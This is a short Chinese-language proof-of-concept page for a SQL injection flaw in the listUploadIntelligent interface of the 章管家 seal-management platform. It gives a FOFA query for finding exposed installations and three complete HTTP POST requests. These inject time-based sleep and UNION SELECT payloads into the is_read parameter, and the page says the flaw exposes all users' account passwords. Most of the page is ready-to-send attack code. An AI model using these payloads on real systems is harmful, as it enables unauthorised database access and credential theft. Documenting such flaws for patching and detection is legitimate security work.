# 章管家listUploadIntelligent接口存在sql注入漏洞

listUploadIntelligent接口存在 SQL 注入漏洞。攻击者可以通过构造特定的 POST 请求注入恶意 SQL 代码，利用该漏洞对数据库执行任意 SQL 操作，获取所有用户的账户密码信息。

## fofa

```java
app="章管家-印章智慧管理平台"
```

## poc

```java
POST /app/message/listUploadIntelligent.htm?&person_id=1&unit_id=1 HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 119

pageNo=1&pageSize=20&keyWord=&startDate=&endDate=&deptIds=&type_id=&is_read=-1 and (select*from(select%0Asleep(10))x)
```

```java
POST /app/message/listUploadIntelligent.htm?token=dingtalk_token&person_id=1&unit_id=1 HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 119

pageNo=1&pageSize=20&keyWord=&startDate=&endDate=&deptIds=&type_id=&is_read=-1 and (select*from(select%0Asleep(10))x)
```

```java
POST /app/message/listUploadIntelligent.htm?token=dingtalk_token&person_id=1&unit_id=1 HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 131

pageNo=1&pageSize=20&keyWord=&startDate=&endDate=&deptIds=&type_id=&is_read=-1 union select md5(123456),2,3,4,5,6,7,8,9,10,11,12 --
```

![图片.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408121121661.png)



## 漏洞来源

- https://forum.butian.net/article/528